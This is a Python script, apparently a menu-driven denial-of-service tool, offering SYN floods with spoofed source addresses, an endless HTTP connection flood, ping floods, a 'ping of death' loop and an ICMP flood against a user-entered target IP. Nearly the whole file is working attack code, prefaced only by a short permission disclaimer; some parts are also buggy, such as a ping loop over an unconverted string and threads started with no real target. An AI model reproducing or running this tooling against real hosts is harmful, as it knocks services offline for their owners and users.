from os import system
from sys import stdout
from random import randint
import os
import socket
import threading
import time
from scapy.all import *
fake_ip = '44.197.175.168'
attack_num = 0

def randomIP():
	ip = ".".join(map(str, (randint(0,255)for _ in range(4))))
	return ip


def randInt():
	x = randint(1000,9000)
	return x


def SYN_Flood(dstIP,dstPort,counter):
	total = 0
	print ("Sending packets...")

	for x in range (0,counter):
		s_port = randInt()
		s_eq = randInt()
		w_indow = randInt()

		IP_Packet = IP()
		IP_Packet.src = randomIP()
		IP_Packet.dst = dstIP

		TCP_Packet = TCP()
		TCP_Packet.sport = s_port
		TCP_Packet.dport = dstPort
		TCP_Packet.flags = "S"
		TCP_Packet.seq = s_eq
		TCP_Packet.window = w_indow

		send(IP_Packet/TCP_Packet, verbose=0)
		total+=1

	stdout.write("\nTotal packets sent: %i\n" % total)
def Ping_sl():
    ip = str(input("Target IP: "))
    ping_number = input("Number of pings: ")
    for a in range(ping_number):
        os.system("ping " + ip)
def Pingofdeath():
    victimIP = str(input("Target IP: "))
    pingCommand = "ping " + victimIP + " -l 65500 -w 1 -n 1"
        
    while(1):
        os.system(pingCommand)

def Icmpflood():
    targetip = str(input("Target IP: "))
    cycle = int(input("Number of packets: "))

    for x in range (0,int(cycle)):
        send(IP(dst=targetip)/ICMP())

def main():
    os.system("clear")
    print("Disclaimer: Illecit use of this tool could lead to a violation of federal and local laws.")
    print("Use this tool only on your own website or websites from which you have obtained permission.")
    time.sleep(5)
    os.system("clear")
    print("  ______    ____       _____")
    print(" /_  __/   / __ \____ / ___/")
    print("  / /_____/ / / / __ \\__ \ ")
    print(" / /_____/ /_/ / /_/ /__/ / ")
    print("/_/     /_____/\____/____/  ")
    print("Coded By: ParzivalHack")
    print("Github: https://github.com/ParzivalHack")
    print("      [Menu]      ")
    print("1) SYN Flood Attack")
    print("2) HTTP Flood Attack")
    print("3) Slowloris Ping Attack")
    print("4) Ping Flood Attack")
    print("5) Ping of Death Attack")
    print("6) ICMP Flood Attack")
    option = int(input("Choose an option: "))
    print(option)
    if option == 1:
        os.system("clear")
        print("Disclaimer: On Termux this attack doesn't work (unless you are Root)")
        print("because of sockets permissions.")   
        time.sleep(5)
        os.system("clear")
        print("  ______    ____       _____")
        print(" /_  __/   / __ \____ / ___/")
        print("  / /_____/ / / / __ \\__ \ ")
        print(" / /_____/ /_/ / /_/ /__/ / ")
        print("/_/     /_____/\____/____/  ")
        dstIP = str(input("Target IP: "))
        dstPort = int(input("Target Port (443 suggested): "))
        counter = int(input("Packets to send (5000 suggested): "))
        SYN_Flood(dstIP,dstPort,int(counter))
    elif option == 2:
        os.system("clear")
        print("  ______    ____       _____")
        print(" /_  __/   / __ \____ / ___/")
        print("  / /_____/ / / / __ \\__ \ ")
        print(" / /_____/ /_/ / /_/ /__/ / ")
        print("/_/     /_____/\____/____/  ")
        target = str(input("Target IP: "))
        port = int(input("Target Port (80 suggested): "))
        while True:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.sendto(("GET /" + target +"HTTP/1.1\r\n").encode('ascii'), (target, port))
            s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
            
            global attack_num
            attack_num += 1
            print(attack_num)
            
            s.close()
            for i in range(500):
                thread = threading.Thread(target = 0)
                thread.start()
    elif option == 3:
        os.system("clear")
        print("  ______    ____       _____")
        print(" /_  __/   / __ \____ / ___/")
        print("  / /_____/ / / / __ \\__ \ ")
        print(" / /_____/ /_/ / /_/ /__/ / ")
        print("/_/     /_____/\____/____/  ")
        Ping_sl()
    elif option == 4:
        os.system("clear")
        print("  ______    ____       _____")
        print(" /_  __/   / __ \____ / ___/")
        print("  / /_____/ / / / __ \\__ \ ")
        print(" / /_____/ /_/ / /_/ /__/ / ")
        print("/_/     /_____/\____/____/  ")
        ip_addr = str(input("Target IP: ")) 
        stream = os.popen('ping -c 5000 {}'.format(ip_addr))
        output = stream.read() 
        if '0 received' in output:
            print('IP unreachable')
        else:
            print('IP reachable')
            print(output)
    elif option == 5:
        os.system("clear")
        print("  ______    ____       _____")
        print(" /_  __/   / __ \____ / ___/")
        print("  / /_____/ / / / __ \\__ \ ")
        print(" / /_____/ /_/ / /_/ /__/ / ")
        print("/_/     /_____/\____/____/  ")
        Pingofdeath()
    elif option == 6:
        os.system("clear")
        print("  ______    ____       _____")
        print(" /_  __/   / __ \____ / ___/")
        print("  / /_____/ / / / __ \\__ \ ")
        print(" / /_____/ /_/ / /_/ /__/ / ")
        print("/_/     /_____/\____/____/  ")
        Icmpflood()
if __name__ == "__main__":
    main()
